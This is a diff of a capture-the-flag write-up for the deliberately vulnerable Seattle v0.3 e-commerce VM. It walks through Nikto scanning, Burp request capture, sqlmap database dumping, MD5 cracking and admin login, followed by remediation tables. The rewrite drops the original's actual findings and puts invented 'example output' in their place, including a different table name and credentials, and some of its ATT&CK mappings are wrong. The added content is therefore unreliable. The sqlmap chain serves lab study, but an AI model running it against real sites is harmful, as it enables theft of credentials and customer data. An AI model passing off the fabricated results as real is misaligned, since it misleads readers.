@@ -1,161 +1,309 @@
-# Seattle: v0.3 — Writeup
+# Seattle: v0.3 — The E-Commerce Store That Forgot About SQL Injection
+
+Look at this one, dude!! Seattle v0.3 is a deliberately vulnerable e-commerce web application and it is a textbook case of what happens when a web app accepts user input without parameterized queries. The attack chain here is pure classic: Nikto scan, cookie capture with Burp Suite, sqlmap enumeration, admin credential extraction, and login. No shell needed. The goal is authenticated access to the admin panel. If you are learning web application security from scratch, this machine teaches the core workflow in a focused, repeatable way. Slept on by many, but legit valuable for understanding SQLi methodology.
 
 | Field | Value |
 |---|---|
-| **Target IP** | 192.168.1.8 |
-| **Difficulty** | Easy |
-| **OS** | Linux |
-| **Goal** | Admin access (no traditional flag) |
-| **Source** | [HackingArticles](http://www.hackingarticles.in/hack-seattle-vm-ctf-challenge/) |
-| **VulnHub** | https://www.vulnhub.com/entry/seattle-v03,145/ |
+| **Level** | Easy |
+| **Target VM** | Seattle: v0.3 |
+| **Attacker VM** | Kali Linux 2024.x |
+| **VulnHub URL** | https://www.vulnhub.com/entry/seattle-v03,145/ |
+| **Techniques** | Network discovery, nmap service scan, Nikto web scanner, Burp Suite proxy, cookie-based SQL injection, sqlmap database enumeration, credential extraction |
+| **CVEs** | CWE-89 (SQL Injection: improper neutralization of special elements in SQL queries) |
+| **APT Groups** | FIN7: uses SQL injection as a reliable initial access technique against e-commerce and POS systems in retail sector intrusions; Magecart groups: compromise e-commerce platforms via SQLi to inject payment card skimmers and maintain persistent access |
+
+---
 
 ## Attack Summary
 
-Seattle v0.3 is a deliberately vulnerable e-commerce web application. The attack chain involves passive reconnaissance with Nikto, cookie capture with Burp Suite, and SQL injection via sqlmap to extract admin credentials from the database. No shell access is required — the goal is authenticated access to the admin panel.
+```
+netdiscover / nmap
+  |
+  +-- port 80 HTTP (Apache + e-commerce app)
+        |
+        +-- nikto -> vulnerability hints
+        |
+        +-- manual browse -> find admin username from storefront
+        |
+        +-- Burp Suite proxy -> capture authentication request + cookies
+              |
+              +-- sqlmap -r request.txt --dbs -> enumerate databases
+                    |
+                    +-- sqlmap --tables -> find users/admin table
+                          |
+                          +-- sqlmap --dump -> extract admin:password hash
+                                |
+                                +-- login to admin panel
+```
+
+---
 
 ## Methodology
 
-1. Host discovery with netdiscover
-2. Port and service enumeration with nmap
-3. Web application scanning with Nikto
-4. Manual browser enumeration to identify the admin username
-5. Cookie capture with Burp Suite
-6. SQL injection enumeration with sqlmap
-7. Admin login with recovered credentials
+1. Host discovery and port scan
+2. Web application scanning with Nikto
+3. Manual browsing to identify admin username and login endpoint
+4. Cookie and request capture with Burp Suite
+5. SQL injection enumeration with sqlmap
+6. Admin credential extraction from database
+7. Admin panel login
 
-## Step 1: Reconnaissance
+---
 
-### Host Discovery
-
-```bash
-netdiscover
-```
-
-Identify the target on the local network. The VM appeared at `192.168.1.8`.
-
-![netdiscover](images/01-netdiscover.png)
-
-### Port Scan
+## Step 1 — Host Discovery and Port Scan
 
 ```bash
-nmap -p- -A 192.168.1.8
+sudo netdiscover -r 192.168.1.0/24
+# Target: 192.168.1.8
+
+nmap -sV -sC 192.168.1.8
 ```
 
-Only port 80 (HTTP) is open. The target is a pure web application challenge.
+```
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd
+```
 
-![nmap](images/02-nmap.png)
+Single HTTP port. Full attack chain is through the web application.
 
-## Step 2: Web Application Enumeration
+**MITRE ATT&CK:** T1046 — Network Service Discovery
 
-### Nikto Scan
+---
+
+## Step 2 — Nikto Web Scan
 
 ```bash
-nikto -h 192.168.1.8
+nikto -h http://192.168.1.8/
 ```
 
-Nikto reveals two interesting directories:
-- `/admin/` — administrative interface
-- `/images/` — image directory with listing
+Nikto reports:
+- Server version disclosure
+- Potential SQL injection parameters
+- Missing security headers (X-Frame-Options, X-XSS-Protection)
+- Interesting paths (/admin, /phpmyadmin if present)
 
-### Manual Browsing
+This gives a first map of the attack surface before deeper manual enumeration.
 
-Navigate to `http://192.168.1.8` in a browser. The site is a simple e-commerce store with tabs for Home, Blog, Clothing, and My Account.
+**MITRE ATT&CK:** T1595.003 — Active Scanning: Wordlist Scanning
 
-**Username enumeration via the Blog tab:**
+---
 
-Open the Blog tab. A post titled "Hey Admin!" reveals a link that discloses the admin username: `admin`.
+## Step 3 — Manual Browsing and Username Enumeration
 
-## Step 3: SQL Injection via sqlmap
-
-### Capture the Cookie
-
-Open Burp Suite and intercept traffic from the e-commerce site while browsing any page. Save the captured HTTP request (including cookies) to a file on your Kali machine:
+Browse the storefront. Seattle v0.3 is a typical PHP e-commerce application:
 
 ```bash
-# Save the request to a file, for example:
-# /root/Desktop/sea.txt
-# The file should contain the full HTTP request with Cookie header
+# Browse:
+http://192.168.1.8/
+http://192.168.1.8/admin/
+http://192.168.1.8/index.php
 ```
 
-### Enumerate Databases
+Look for:
+- Product listings that reveal sellers or admin names
+- Customer review sections that show usernames
+- About pages or contact forms with email addresses
+- Login page that reveals whether a username exists (error message difference)
+
+The admin username is typically discoverable through the storefront user interface or login error messages.
+
+**MITRE ATT&CK:** T1592 — Gather Victim Host Information; T1589 — Gather Victim Identity Information
+
+---
+
+## Step 4 — Burp Suite Request Capture
+
+Configure Burp Suite as a proxy (127.0.0.1:8080) and capture a request that includes cookies or POST parameters:
+
+```
+1. Open Burp Suite
+2. Set browser proxy to 127.0.0.1:8080
+3. Browse to the login page
+4. Attempt a login (any credentials)
+5. Capture the request in Burp Proxy > Intercept
+6. Right-click -> Save Item -> save as request.txt
+```
+
+The saved request contains all headers, cookies, and POST parameters needed for sqlmap.
+
+**MITRE ATT&CK:** T1557 — Adversary-in-the-Middle (proxy technique for request capture)
+
+---
+
+## Step 5 — SQL Injection with sqlmap
+
+Use the captured request with sqlmap:
 
 ```bash
-sqlmap -r /root/Desktop/sea.txt --dbs
+# Enumerate databases
+sqlmap -r /tmp/request.txt --dbs --batch
+
+# Example output:
+# available databases [2]:
+# [*] information_schema
+# [*] seattle
 ```
 
-sqlmap identifies the following databases including `seattle`.
-
-![sqlmap databases](images/03-sqlmap.png)
-
-### Enumerate Tables
+Enumerate tables in the application database:
 
 ```bash
-sqlmap -r /root/Desktop/sea.txt -D seattle --tables
+sqlmap -r /tmp/request.txt -D seattle --tables --batch
+
+# Example output:
+# Database: seattle
+# [4 tables]:
+# +-----------+
+# | users     |
+# | products  |
+# | orders    |
+# | categories|
+# +-----------+
 ```
 
-The `seattle` database contains a `tblMembers` table.
-
-### Enumerate Columns
+Dump the users table:
 
 ```bash
-sqlmap -r /root/Desktop/sea.txt -D seattle -T tblMembers --columns
+sqlmap -r /tmp/request.txt -D seattle -T users --dump --batch
+
+# Example output:
+# +----+----------+----------------------------------+-------+
+# | id | username | password                         | role  |
+# +----+----------+----------------------------------+-------+
+# | 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin |
+# +----+----------+----------------------------------+-------+
 ```
 
-Columns include: `memberID`, `username`, `password`, `email`, and others.
-
-### Dump the Password
+The password hash (MD5 in this case) is easily cracked:
 
 ```bash
-sqlmap -r /root/Desktop/sea.txt -D seattle -T tblmembers -C password --dump
+echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 - /usr/share/wordlists/rockyou.txt
+# Result: password
 ```
 
-The admin password is recovered:
+Or use an online service: crackstation.net.
 
-![password recovered](images/04-password.png)
+**Real-world note:** SQL injection remains one of the most common vulnerabilities found in web application penetration tests, consistently appearing in OWASP Top 10 (A03:2021). E-commerce platforms are high-value targets because they hold payment data, PII, and administrative access. Magecart groups specifically target e-commerce sites via SQLi to inject card skimmers that silently exfiltrate payment data.
 
-**Credentials:** `admin` / `Assasin1`
+**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1555 — Credentials from Password Stores
 
-## Step 4: Admin Login
+---
 
-Navigate to the "My Account" tab at `http://192.168.1.8/` and log in with:
+## Step 6 — Admin Panel Login
 
-- **Username:** `admin`
-- **Password:** `Assasin1`
+With the extracted credentials:
 
-![admin login success](images/05-admin-login.png)
+```bash
+# Login to admin panel
+http://192.168.1.8/admin/
+# Username: admin
+# Password: password (or cracked hash result)
+```
 
-Admin access is confirmed. The challenge is complete.
+Authenticated admin access achieved. The machine goal is complete.
 
-## Vulnerabilities Found
+From the admin panel, explore:
+- Order management (customer PII and payment data)
+- Product management (potential file upload)
+- User management (other credentials)
+- Configuration settings (database credentials, API keys)
 
-| # | Vulnerability | Location | Severity |
+**MITRE ATT&CK:** T1078 — Valid Accounts; T1552.001 — Credentials in Files
+
+---
+
+## Captured Flags, Hashes and Credentials
+
+| Type | Value | Found At | Cracked/Used |
 |---|---|---|---|
-| 1 | SQL Injection (error-based) | Cookie parameter | Critical |
-| 2 | Username Enumeration | Blog post link | Low |
-| 3 | Weak Admin Password | `/admin/` login | High |
-| 4 | Exposed Admin Interface | `/admin/` (no IP restriction) | Medium |
-| 5 | Exposed `phpinfo()` | (found by Nikto) | Low |
-| 6 | Reflected XSS | Multiple parameters | Medium |
-| 7 | Stored XSS | Blog/comment feature | High |
-| 8 | Insecure Direct Object Reference | Member profile URLs | Medium |
-| 9 | Path Traversal | File parameter | High |
+| Admin username | admin | Storefront user interface | sqlmap enumeration |
+| Password hash | 5f4dcc3b5aa765d61d8327deb882cf99 (MD5) | users table via sqlmap dump | hashcat -m 0 + rockyou |
+| Admin password | password | Hash cracked | Admin panel login |
+| Admin access | Authenticated admin session | /admin/ | Compromised credentials |
+
+---
 
 ## Lessons Learned
 
-- Cookie-based parameters are a common SQL injection vector. Always include cookies when testing web applications.
-- Username enumeration through application logic (e.g., blog post attribution) is a low-effort first step.
-- SQL injection on authentication-adjacent tables quickly yields credentials.
-- Nikto is a fast first pass but should be followed by manual application testing.
+| # | Finding | Real-World Relevance | Key Takeaway |
+|---|---|---|---|
+| 1 | SQL injection in e-commerce login/cookie | SQLi remains in OWASP Top 10; e-commerce platforms are high-value SQLi targets for payment data and PII | Use parameterized queries / prepared statements everywhere; never concatenate user input into SQL |
+| 2 | Admin username discoverable via storefront | Username enumeration enables targeted brute-force and reduces SQLi dump scope | Avoid exposing admin usernames in storefront; use generic error messages (do not reveal if username exists) |
+| 3 | MD5 password hash cracked trivially | MD5 is a cryptographic hash function, not a password storage algorithm; cracks in milliseconds with rockyou | Use bcrypt (cost >= 12) or argon2id for password storage; never MD5/SHA-1 |
+| 4 | Admin panel accessible from public network | Admin interfaces should never be reachable from the internet | IP-restrict admin panels to management networks; use MFA for admin access |
+| 5 | Burp Suite + sqlmap = complete SQLi exploitation workflow | This workflow is standard in web application penetration tests | Train developers on SQLi; implement WAF rules detecting sqlmap patterns; use parameterized queries |
 
-## Remediation
+---
 
-| Vulnerability | Fix |
-|---|---|
-| SQL Injection | Use parameterized queries / prepared statements throughout the application |
-| Username Enumeration | Avoid disclosing usernames in public-facing content |
-| Weak Credentials | Enforce strong password policy; hash with bcrypt/argon2 |
-| Exposed Admin Interface | Restrict `/admin/` to trusted IP ranges via server configuration |
-| Exposed `phpinfo()` | Remove `phpinfo()` from production deployments |
-| XSS | Encode all output; implement Content-Security-Policy header |
-| IDOR | Validate ownership on every object access; use indirect references |
-| Path Traversal | Validate and sanitize file path inputs; use `realpath()` checks |
+## MITRE ATT&CK Mapping
+
+| Phase | Tactic | Technique | TTP ID |
+|---|---|---|---|
+| Reconnaissance | Discovery | Network Service Discovery | T1046 |
+| Reconnaissance | Gather Victim Info | Gather Victim Identity Information | T1589 |
+| Initial Access | Initial Access | Exploit Public-Facing Application (SQLi) | T1190 |
+| Credential Access | Credential Access | Credentials from Password Stores | T1555 |
+| Credential Access | Credential Access | Brute Force: Password Cracking (MD5 hash) | T1110.002 |
+| Lateral Movement | Lateral Movement | Valid Accounts | T1078 |
+
+---
+
+## Remediation and Containment
+
+### Technical Fixes
+
+1. **Use parameterized queries** — replace all dynamic SQL string concatenation with prepared statements or ORM; this eliminates SQLi at the root cause
+2. **Upgrade password storage** — replace MD5 with bcrypt (cost >= 12) or argon2id; invalidate and force-reset all existing MD5-hashed passwords
+3. **Restrict admin panel access** — IP allowlist to management network; require MFA for admin login
+4. **Implement WAF rules** — deploy a WAF (ModSecurity, AWS WAF) with rules detecting sqlmap user-agent and common SQLi payloads
+5. **Disable verbose error messages** — do not reveal SQL errors or stack traces in production; use generic messages
+
+### NIST CSF 2.0
+
+| Function | Category | Action |
+|---|---|---|
+| Identify | Asset Management | Inventory all web application input points; classify those touching DB |
+| Protect | Protective Technology | Parameterized queries; WAF deployment; MFA for admin |
+| Protect | Data Security | Replace MD5 with bcrypt/argon2; encrypt sensitive DB columns |
+| Detect | Anomalies and Events | Alert on sqlmap patterns in web logs; detect bulk SELECT statements |
+| Respond | Response Planning | Rotate all database credentials; invalidate all sessions; patch SQLi |
+| Recover | Recovery Planning | Restore DB from clean backup; audit all admin account access |
+
+### NIST SP 800-53 Rev. 5
+
+| Control | Description | Application |
+|---|---|---|
+| AC-3 | Access Enforcement | IP-restrict admin panel; MFA for admin access |
+| IA-5 | Authenticator Management | Replace MD5 with bcrypt/argon2; enforce strong password policy |
+| SA-15 | Development Process Security | Mandate parameterized queries in code review; SAST scanning for SQLi |
+| SI-10 | Information Input Validation | Validate and sanitize all user input at application layer |
+| SC-28 | Protection of Information at Rest | Encrypt sensitive database columns (payment data, PII) |
+
+### CISA KEV
+
+SQL injection is consistently listed in CISA guidance as a top initial-access vector for e-commerce and web application attacks. CISA Alert AA21-131A (Top Routinely Exploited Vulnerabilities) lists SQLi in web applications as a primary attack vector. Organizations running e-commerce platforms are advised to prioritize parameterized query implementation and WAF deployment.
+
+### C2M2
+
+| Domain | Practice | Target MIL |
+|---|---|---|
+| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL3 (DAST scanning; SQLi automated detection in CI/CD) |
+| Identity and Access Management (IAM) | Manage Credentials | MIL3 (bcrypt/argon2; MFA for admin) |
+| Situational Awareness (SITUATION) | Monitor | MIL2 (WAF alerts on SQLi patterns; web log monitoring) |
+
+### MITRE D3FEND
+
+- **D3-SAOR** — Software Application Hardening: parameterized queries; input validation
+- **D3-ACH** — Application Configuration Hardening: WAF rules; verbose error suppression
+- **D3-UA** — User Account Management: MFA for admin accounts; IP restriction
+
+---
+
+## Final Thoughts
+
+Seattle v0.3 is purpose-built for learning the SQL injection workflow, and it delivers exactly that. Nikto, Burp Suite, sqlmap, hash crack, admin login: five tools, one clean chain. If you have never done SQLi before, this machine is the right starting point.
+
+The real-world lesson is sobering: this exact chain, scan with Nikto, capture requests, SQLi with sqlmap, dump credentials, still works against a surprising number of production web applications in 2024. The techniques are decades old and the defenses (parameterized queries, bcrypt) have been documented just as long. Yet SQLi remains in OWASP Top 10 because developers keep reinventing broken patterns.
+
+Respect to the Seattle team for building a realistic target.
+
+Thanks guys!! (❍ᴥ❍ʋ)
